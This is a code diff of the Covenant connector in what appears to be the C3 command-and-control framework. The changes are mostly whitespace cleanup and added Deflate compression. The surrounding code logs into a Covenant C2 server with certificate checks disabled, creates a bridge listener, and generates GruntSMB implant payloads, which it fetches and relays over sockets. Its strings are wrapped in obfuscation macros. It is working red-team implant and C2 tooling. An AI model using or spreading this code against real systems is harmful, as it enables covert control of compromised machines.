@@ -3,6 +3,7 @@
 #include "Common/json/json.hpp"
 #include "Common/CppRestSdk/include/cpprest/http_client.h"
 #include "Common/MWR/Crypto/Base64.h"
+#include "Common/MWR/CppTools/Compression.h"
 
 using json = nlohmann::json;
 
@@ -146,23 +147,23 @@ MWR::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 	json response;
 
 	std::tie(m_ListeningPostAddress, m_ListeningPostPort, m_webHost, m_username, m_password) = arguments.Read<std::string, uint16_t, std::string, std::string, std::string>();
-	
+
 	/***Authenticate to Web API ***/
 	std::string url = this->m_webHost + OBF("/api/users/login");
-	
+
 	postData[OBF("username")] = this->m_username;
 	postData[OBF("password")] = this->m_password;
-	
+
 	web::http::client::http_client_config config;
 	config.set_validate_certificates(false); //Covenant framework is unlikely to have a valid cert.
-	
+
 	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
 	web::http::http_request request;
 
 	request = web::http::http_request(web::http::methods::POST);
 	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
 	request.set_body(utility::conversions::to_string_t(postData.dump()));
-	
+
 	pplx::task<web::http::http_response> task = webClient.request(request);
 	web::http::http_response resp = task.get();
 
@@ -186,10 +187,10 @@ MWR::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 	web::http::client::http_client webClientBridge(utility::conversions::to_string_t(url), config);
 	request = web::http::http_request(web::http::methods::POST);
 	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/x-www-form-urlencoded")));
-	
+
 	std::string authHeader = OBF("Bearer ") + this->m_token;
 	request.headers().add(OBF_W(L"Authorization"), utility::conversions::to_string_t(authHeader));
-	
+
 	std::string createBridgeString = "Id=0&GUID=b85ea642f2&ListenerTypeId=2&Status=Active&CovenantToken=&Description=A+Bridge+for+custom+listeners.&Name=C3Bridge&BindAddress=0.0.0.0&BindPort=" + \
 		std::to_string(this->m_ListeningPostPort) + "&ConnectPort=" + std::to_string(this->m_ListeningPostPort) + "&ConnectAddresses%5B0%5D=" + \
 		this->m_ListeningPostAddress + "&ProfileId=3";
@@ -208,10 +209,10 @@ MWR::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 
 		std::string authHeader = OBF("Bearer ") + this->m_token;
 		request.headers().add(OBF_W(L"Authorization"), utility::conversions::to_string_t(authHeader));
-		
+
 		task = webClientListeners.request(request);
 		resp = task.get();
-		
+
 		bool found = false;
 
 
@@ -243,7 +244,7 @@ MWR::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
 	else
 		throw std::exception((OBF("[Covenant] Error setting up BridgeListener, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
 
-	
+
 }
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 MWR::C3::Interfaces::Connectors::Covenant::~Covenant()
@@ -300,14 +301,14 @@ MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteV
 	json postData;
 	postData[OBF("id")] = this->m_ListenerId;
 	postData[OBF("smbPipeName")] = pipename;
-	postData[OBF("listenerId")] = this->m_ListenerId; 
+	postData[OBF("listenerId")] = this->m_ListenerId;
 	postData[OBF("outputKind")] = OBF("ConsoleApplication");
 	postData[OBF("implantTemplateId")] = 2; //for GruntSMB template
 	postData[OBF("dotNetFrameworkVersion")] = OBF("Net40");
 	postData[OBF("type")] = OBF("Wmic");
 	postData[OBF("delay")] = delay;
-	postData[OBF("jitterPercent")] = jitter; 
-	postData[OBF("connectAttempts")] = connectAttempts; 
+	postData[OBF("jitterPercent")] = jitter;
+	postData[OBF("connectAttempts")] = connectAttempts;
 
 	//First we use a PUT to add our data as the template.
 	request = web::http::http_request(web::http::methods::PUT);
@@ -319,19 +320,19 @@ MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteV
 		request.headers().add(OBF_W(L"Authorization"), utility::conversions::to_string_t(authHeader));
 		pplx::task<web::http::http_response> task = webClient.request(request);
 		web::http::http_response resp = task.get();
-		
+
 		//If we get 200 OK, then we use a POST to request the generation of the payload. We can reuse the previous data here.
 		if (resp.status_code() == web::http::status_codes::OK)
 		{
 			request.set_method(web::http::methods::POST);
 			task = webClient.request(request);
 			resp = task.get();
-			
+
 			auto respData = resp.extract_string();
 			json resp = json::parse(respData.get());
 			binary = resp[OBF("base64ILByteString")].get<std::string>(); //Contains the base64 encoded .NET assembly.
 		}
-		
+
 		auto payload = cppcodec::base64_rfc4648::decode(binary);
 
 		//Finally connect to the socket.
@@ -399,7 +400,7 @@ MWR::ByteView MWR::C3::Interfaces::Connectors::Covenant::GetCapability()
 				"min": 1,
 				"description": "Username to authenticate"
 			},
-			{	
+			{
 				"type": "string",
 				"name": "Password",
 				"min": 1,
@@ -469,18 +470,20 @@ void MWR::C3::Interfaces::Connectors::Covenant::Connection::Send(ByteView data)
 		throw std::runtime_error(OBF("Could not lock pointer to owner "));
 
 	std::unique_lock<std::mutex> lock{ owner->m_SendMutex };
-	
+
+	auto unpacked = Compression::Decompress<Compression::Deflate>(data);
+
 	//Format the length to match how it is read by Covenant.
-	DWORD length = static_cast<DWORD>(data.size());
+	DWORD length = static_cast<DWORD>(unpacked.size());
 	BYTE* bytes = (BYTE*)& length;
 	DWORD32 chunkLength = (bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3];
-	
+
 	// Write four bytes indicating the length of the next chunk of data.
 	if (SOCKET_ERROR == send(m_Socket, (char *)&chunkLength, 4, 0))
 		throw MWR::SocketsException(OBF("Error sending to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
 
 	// Write the chunk to socket.
-	send(m_Socket, (char *)&data.front(), length, 0);
+	send(m_Socket, (char *)&unpacked.front(), length, 0);
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -496,7 +499,7 @@ MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::Connection::Receive()
 	//Format the length to match how it is written by Covenant.
 	BYTE* bytes = (BYTE*)& chunkLength;
 	DWORD32 len = (bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3];
-	
+
 	// Read in the result.
 	ByteVector buffer;
 	buffer.resize(len);
@@ -510,7 +513,7 @@ MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::Connection::Receive()
 			throw MWR::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
 		}
 
-	return buffer;
+	return Compression::Compress<Compression::Deflate>(buffer);
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -552,7 +555,7 @@ MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::PeripheralCreationCom
 {
 	auto [pipeName, listenerId, delay, jitter, connectAttempts] = data.Read<std::string, uint32_t, uint32_t, uint32_t, uint32_t>();
 
-	
+
 	return ByteVector{}.Write(pipeName, GeneratePayload(connectionId, pipeName, delay, jitter, listenerId, connectAttempts), connectAttempts);
 }
 
